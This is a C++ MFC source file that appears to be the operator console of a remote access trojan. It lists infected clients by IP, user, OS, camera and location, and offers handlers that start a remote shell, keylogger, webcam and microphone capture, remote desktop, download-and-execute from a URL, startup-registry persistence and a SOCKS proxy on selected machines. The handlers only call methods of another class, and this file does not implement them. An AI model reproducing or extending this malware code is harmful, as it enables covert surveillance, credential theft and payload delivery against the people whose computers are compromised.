#include "stdafx.h"
#include "ClientGroup.h"
#include "KernelSrv.h"
#include "Resource.h"
#include "GetStrDlg.h"
#include "UrlInputDlg.h"
#include "FileSelectDlg.h"
#include "utils.h"
#include "MainFrm.h"
#include "dbg.h"

CClientGroup::CClientGroup(CONST TCHAR * GroupName)
{
	m_LastSortColum = 1;
	m_ascending = 1;
	lstrcpy(m_GroupName, GroupName);
}


CClientGroup::~CClientGroup()
{

}

BEGIN_MESSAGE_MAP(CClientGroup, CMFCListCtrl)
	
	ON_WM_CREATE()
	//ON_NOTIFY_REFLECT(NM_RCLICK, &CClientGroup::OnNMRClick)
	ON_COMMAND(ID_POWER_REBOOT, &CClientGroup::OnPowerReboot)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CClientGroup::OnPowerShutdown)
	ON_COMMAND(ID_SESSION_DISCONNECT, &CClientGroup::OnSessionDisconnect)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CClientGroup::OnOperationEditcomment)

	ON_COMMAND(ID_OPERATION_CMD, &CClientGroup::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientGroup::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientGroup::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_CAMERA, &CClientGroup::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CClientGroup::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientGroup::OnOperationMicrophone)
	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientGroup::OnOperationKeyboard)
	ON_COMMAND(ID_UTILS_ADDTO, &CClientGroup::OnUtilsAddto)
	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientGroup::OnUtilsCopytostartup)

	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientGroup::OnUtilsDownloadandexec)
	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CClientGroup::OnProxySocksproxy)
	ON_COMMAND(ID_SESSION_EXIT, &CClientGroup::OnSessionExit)
	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CClientGroup::OnUtilsOpenwebpage)
	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CClientGroup::OnOperationProcessmanager)
	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, &CClientGroup::OnLvnColumnclick)
	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CClientGroup::OnRemotedesktopDxgi)
	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CClientGroup::OnRemotedesktopGdi)
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_OPERATION_MODIFYGROUP, &CClientGroup::OnOperationModifygroup)
END_MESSAGE_MAP()


int CClientGroup::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CMFCListCtrl::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO:  在此添加您专用的创建代码
	//LVS_EX_GRIDLINES,分隔线
	//LVS_EX_CHECKBOXES 复选框
	//LVS_EX_FULLROWSELECT选择整列
	//LVS_EX_AUTOCHECKSELECT自动选择复选框;
	//LVS_SINGLESEL 取消单行限制
	DWORD dwExStyle = GetExStyle();
	ModifyStyle(LVS_SINGLESEL, 0);
	dwExStyle |= LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_AUTOCHECKSELECT | LVS_EX_CHECKBOXES;
	SetExtendedStyle(dwExStyle);
	//左对齐
	InsertColumn(0, TEXT("IP"), LVCFMT_LEFT, 120);
	InsertColumn(1, TEXT("Private IP"), LVCFMT_LEFT, 120);		//OK
	InsertColumn(2, TEXT("Host"), LVCFMT_LEFT, 100);				//OK
	InsertColumn(3, TEXT("User"), LVCFMT_LEFT, 100);				//OK
	InsertColumn(4, TEXT("OS"), LVCFMT_LEFT, 110);				//OK
	InsertColumn(5, TEXT("InstallDate"), LVCFMT_LEFT, 160);		//--
	InsertColumn(6, TEXT("CPU"), LVCFMT_LEFT, 120);				//OK
	InsertColumn(7, TEXT("Disk/RAM"), LVCFMT_LEFT, 160);			//OK
	InsertColumn(8, TEXT("HasCamera"), LVCFMT_LEFT, 100);		//OK
	InsertColumn(9, TEXT("Ping"), LVCFMT_LEFT, 70);				//OK
	InsertColumn(10, TEXT("Location"), LVCFMT_LEFT, 100);			//OK

	InsertColumn(11, TEXT("Comment"), LVCFMT_LEFT, 150);			//---
	InsertColumn(12, TEXT(""), LVCFMT_LEFT, 350);					//---
	return 0;
}



void CClientGroup::OnClientLogin(CKernelSrv * kernel)
{
	CKernelSrv*pHandler = (CKernelSrv*)kernel;
	LoginInfo*pLoginInfo = (LoginInfo*)kernel->GetLoginInfo();
	CString Text;

	int idx = GetItemCount();

	//显示目标主机信息
	//IP

	InsertItem(idx, pHandler->GetPublicIP());
	//Private IP
	SetItemText(idx, 1, pLoginInfo->PrivateIP);
	//Host
	SetItemText(idx, 2, pLoginInfo->HostName);
	
	SetItemText(idx, 3, pLoginInfo->User);

	SetItemText(idx, 4, pLoginInfo->OsName);
	
	SetItemText(idx, 5, pLoginInfo->InstallDate);
	
	SetItemText(idx, 6, pLoginInfo->CPU);
	
	SetItemText(idx, 7, pLoginInfo->Disk_RAM);

	//Camera
	Text.Format(TEXT("%d"), pLoginInfo->dwHasCamera);
	SetItemText(idx, 8, Text);
	
	//Ping
	if (pLoginInfo->dwPing != -1)
		Text.Format(TEXT("%d ms"), pLoginInfo->dwPing);
	else
		Text.Format(TEXT("-"));

	SetItemText(idx, 9, Text);

	SetItemText(idx, 10, pHandler->GetLocation());
	//Comment
	SetItemText(idx, 11, pLoginInfo->Comment);
	//
	SetItemText(idx, 12, TEXT(""));
	//保存Handler
	SetItemData(idx, (DWORD_PTR)pHandler);
}


void CClientGroup::OnClientLogout(CKernelSrv * kernel)
{
	CEventHandler*pHandler = kernel;
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = (WPARAM)kernel;
	int index = FindItem(&fi);

	//client 未加入login info 就退出,就会导致index < 0,不影响.
	ASSERT(index >= 0);
	
	DeleteItem(index);
}


void CClientGroup::OnUpdateUploadStatus(CKernelSrv * kernel, LPVOID * ArgList)
{
	TCHAR           szModuleSize[64];
	TCHAR           szFinishedSize[64];
	CEventHandler*  pHandler       = (CEventHandler*)ArgList[0];
	CString         ModuleName     =	 (TCHAR*)ArgList[1];
	LARGE_INTEGER   ModuleSize     = { 0 };
	LARGE_INTEGER   FinishedSize   = { 0 };
	//
	ModuleSize.LowPart= (DWORD)ArgList[2];
	FinishedSize.LowPart = (DWORD)ArgList[3];

	GetStorageSizeString(ModuleSize, szModuleSize);
	GetStorageSizeString(FinishedSize, szFinishedSize);
	//
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = (LPARAM)pHandler;
	int index = FindItem(&fi);

	if (index >= 0)
	{
		CString Status;
		Status.Format(
			TEXT("%s : %s/%s (%.2lf%%)"), 
			ModuleName.GetBuffer(),
			szFinishedSize, 
			szModuleSize, 
			100.00 * FinishedSize.LowPart / ModuleSize.LowPart
		);

		SetItemText(index, 12, Status);
	}
}

void CClientGroup::OnUpdateComment(CKernelSrv *kernel, TCHAR * szNewComment)
{
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = (WPARAM)kernel;
	int index = FindItem(&fi);

	ASSERT(index >= 0);
	SetItemText(index, 11, szNewComment);			//编辑注释.
}


void CClientGroup::OnPowerReboot()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Power_Reboot();
	}
}


void CClientGroup::OnPowerShutdown()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Power_Shutdown();
	}
}


void CClientGroup::OnSessionDisconnect()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos){
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Close();
	}
}


void CClientGroup::OnOperationEditcomment()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	if (!pos)
		return;

	CGetStrDlg dlg(TEXT("Edit Comment"));
	if (dlg.DoModal() != IDOK)
		return;

	pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->EditComment(dlg.m_str.GetBuffer());
	}
}


void CClientGroup::OnOperationCmd()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginCmd();
	}
}


void CClientGroup::OnOperationChatbox()
{
	// TODO:  在此添加命令处理程序代码
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginChat();
	}
}

void CClientGroup::OnOperationFilemanager()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginFileMgr();
	}
}


void CClientGroup::OnOperationCamera()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginCamera();
	}
}


void CClientGroup::OnSessionRestart()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Restart();
	}
}


void CClientGroup::OnOperationMicrophone()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginMicrophone();
	}
}





void CClientGroup::OnOperationKeyboard()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginKeyboardLog();
	}
}


void CClientGroup::OnUtilsAddto()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->UtilsWriteStartupReg();
	}

}


void CClientGroup::OnUtilsCopytostartup()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->UtilsCopyToStartupMenu();
	}
}


void CClientGroup::OnUtilsDownloadandexec()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	if (!pos)
		return;

	CUrlInputDlg dlg;
	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
		return;
	
	//可能在DoModal返回之后ClientList里面的东西变了...
	pos = GetFirstSelectedItemPosition();
	while (pos){
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginDownloadAndExec(dlg.m_Url.GetBuffer());
	}
}


void CClientGroup::OnProxySocksproxy()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginProxy_Socks();
	}
}


void CClientGroup::OnSessionExit()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginExit();
	}
}


void CClientGroup::OnUtilsOpenwebpage()
{
	// TODO:  在此添加命令处理程序代码
	CUrlInputDlg dlg(TEXT("Please input url:"));
	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == 0){
		return;
	}

	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->UtilsOpenWebpage(dlg.m_Url.GetBuffer());
	}
}


void CClientGroup::OnOperationProcessmanager()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginProcessManager();
	}
}


int CALLBACK CClientGroup::CompareByString(LPARAM item1, LPARAM item2, LPARAM obj)
{
	CClientGroup * l = (CClientGroup*)obj;
	CString s1 = l->GetItemText(item1, l->m_sortCol);
	CString s2 = l->GetItemText(item2, l->m_sortCol);

	return l->m_ascending * (s1 - s2 );
}

void CClientGroup::OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO:  在此添加控件通知处理程序代码
	*pResult = 0;

	if (pNMLV->iSubItem != m_LastSortColum)
	{
		m_ascending = 1;
	}
	else
	{
		m_ascending *= -1;
	}

	m_sortCol = pNMLV->iSubItem;
	SortItemsEx(CompareByString,(DWORD_PTR)this);
	return;
}


void CClientGroup::OnRemotedesktopDxgi()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginRemoteDesktop_dxgi();
	}
}


void CClientGroup::OnRemotedesktopGdi()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginRemoteDesktop_gdi();
	}
}


void CClientGroup::OnContextMenu(CWnd* /*pWnd*/, CPoint pt)
{
	CMenu*pMenu = AfxGetMainWnd()->GetMenu()->GetSubMenu(1);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, AfxGetMainWnd());	//阻塞.
}


void CClientGroup::OnOperationModifygroup()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	if (!pos)
		return;

	CGetStrDlg dlg(TEXT("Modify Group"));
	if (dlg.DoModal() != IDOK)
		return;

	pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->EditGroup(dlg.m_str.GetBuffer());
	}
}
